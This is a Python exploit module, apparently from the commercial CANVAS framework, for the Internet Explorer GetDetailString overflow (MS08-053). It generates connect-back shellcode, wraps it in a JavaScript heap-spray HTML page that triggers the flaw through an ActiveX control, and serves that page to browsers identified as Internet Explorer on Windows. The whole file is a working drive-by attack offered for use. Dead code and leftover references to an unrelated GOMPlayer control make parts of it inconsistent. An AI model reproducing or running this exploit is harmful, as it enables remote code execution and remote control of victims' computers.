#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path: sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from encoder import xorencoder, nibble_encoder
from shellcode import shellcodeGenerator, win32shell 
import binascii

NAME="Internet Explorer GetDetailString Overflow (MS08_053)"
DESCRIPTION="A buffer overflow in the GetDetailString allows us execute arbitrary code"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "09/09/2008"
DOCUMENTATION["CVE Name"] = "CVE-2008-3008"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3008"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["Note"] = "After the exploit works, Internet Explorer might crash. (The callback connection will remain working)"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP","2003" ]
PROPERTY['MSADV']='MS08-053'
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:ms08_053 -l 192.168.1.1 -p 8080 -d 5555
"""

CHANGELOG="""

"""

DEBUGNOTES="""
It's a buffer overflow over the OpenURL method. We can overwrite EIP to point it to a jmp esp and execute our shellcode.

We use a javascript method to detect de SP if not specified.
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.badstring="\0\xff"
        self.setVersions()
        self.version=0
        self.name=NAME
        self.filename="ms08_053.html"
        self.listenerArgsDict["fromcreatethread"]=1
        self.subesp=0x100
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows XP", 0x41414141)

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        #sc=shellcodeGenerator.win32()                                                                                        
        #sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        #sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        #sc.addAttr("tcpconnect",{"port":self.callback.port,"ipaddress":self.callback.ip})                                                              
        #sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        #sc.addAttr("ExitThread",None)
        #self.shellcode =sc.get()
        
        import MOSDEF.pelib as pelib
        import shellcode.standalone.windows.payloads as payloads
        p = payloads.payloads()
        self.callback.port
        sc = p.forkload(self.callback.ip, self.callback.port, restorehash=True, load_winsock=True)
        self.shellcode = p.assemble(sc)
        return self.shellcode 
   
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1
        
    def makefile(self, windowsver=0):
        """Makes the actual bad html file to trigger the buffer overflow"""
        if not self.createShellcode():
            return None

        ver = None
        
        if 0:
            if windowsver==0 and self.version!=0:
                #forced version
                ver=self.versions[self.version][1]
                self.log("Using version %s [Forced]" % self.versions[self.version][0])
            
            if not ver:
                ver=[]
                if windowsver=="5.0" or not windowsver:
                    #All Windows 2000 versions
                    
                    #appMinorVersion, jmpesp, osversion
                    ver.append(("SP1",self.versions[3][1],"5.0"))
                if windowsver=="5.1" or not windowsver:
                    #All Windows XP versions
                    
                    #appMinorVersion, jmpesp, osversion
                    ver.append(("SP0",self.versions[1][1],"5.1"))
                    ver.append(("SP1",self.versions[1][1],"5.1"))
                    ver.append(("SP2",self.versions[2][1],"5.1"))
            html="""
            <html>
            <object id='gomplayer' classid='clsid:DC07C721-79E0-4BD4-A89F-C90871946A31'></OBJECT>
            <script language="javascript">
            """
            
            html += "code = unescape(\"" + "%90" * 100
            tmp = binascii.b2a_hex(self.shellcode)
            for x in range(0,len(tmp),2):
                html += "%" + tmp[x:x+2]
            html += "\");\r\n"
            
            html += "var jmp = 0;\r\n"
            
            if isinstance(ver,list):
                for option in ver:
                    if not windowsver:
                        #autodetect windows version from javascript (works in FF and IE)
                        html += "if (navigator.userAgent.indexOf('NT " + option[2] + "') > 0) "
                    
                    #detect SP from js (not so accurate, but works)
                    html += "  if (navigator.appMinorVersion.indexOf('" + option[0] + "') > 0) jmp = unescape(\""
                    tmp = "%08X" % option[1]
                    html += "%%%s%%%s%%%s%%%s" % (tmp[6:8],tmp[4:6],tmp[2:4],tmp[0:2])
                    html += "\");\r\n"
            else:
                #forced version
                html += "jmp = unescape(\""
                tmp = "%08X" % ver
                html += "%%%s%%%s%%%s%%%s" % (tmp[6:8],tmp[4:6],tmp[2:4],tmp[0:2])
                html += "\");\r\n"
            
            html += "if (jmp) gomplayer.OpenURL(\"" + "A"*506 + "\" + jmp + code);\r\n"
        html = """
        <script language="JavaScript" defer>
        ar=new Array();
        function spray(buffer) {
          var hope=unescape("%u0607%u0607");
          var unbuffer=unescape(buffer);
          var v=20+unbuffer.length;
          while(hope.length<v) hope+=hope;
          var fk=hope.substring(0,v);
          var bk=hope.substring(0,hope.length-v);
          delete v;
          delete hope;
          while(bk.length+v<0x40000) bk=bk+bk+fk;
          for(i=0;i<248;i++) ar[i]=bk+unbuffer;
        }
        spray("SHELLCODE");

        function durl()
        {
        var p = unescape( "BUFF" );
	   
	   obj.GetDetailsString(p, 20);
        }

         </script>

 <body onload="JavaScript: return durl();">
	 <object id="obj" classid="clsid:A8D3AD02-7508-4004-B2E9-AD33F087F43C">
   Unable to create object
 </object>
        """.replace('SHELLCODE',urluencode('AAAA' + self.shellcode + "C" * 0x20)).replace("BUFF", "%u0607%u0607"* 520) # 1800
            
        return html
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0:
            #still need to determine if it's pretending to be IE by spoofing User-Agent string
            self.log("Non IE browser connected - returning None")
            return None,None
        
        if user_agent.lower().count("windows nt") == 0:
            #all the supported versions are NT based
            return None,None
        
        #the ugliest python line ever
        windowsver = user_agent.lower().split("windows nt ")[1].split(";")[0].split(")")[0]
        
        #send the exploit
        self.log("Sending the GOMPlayer attack html file")
        sploitstring=self.makefile(windowsver)
        
        if not sploitstring:
            return None,None
        
        b.setBody(sploitstring)

        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
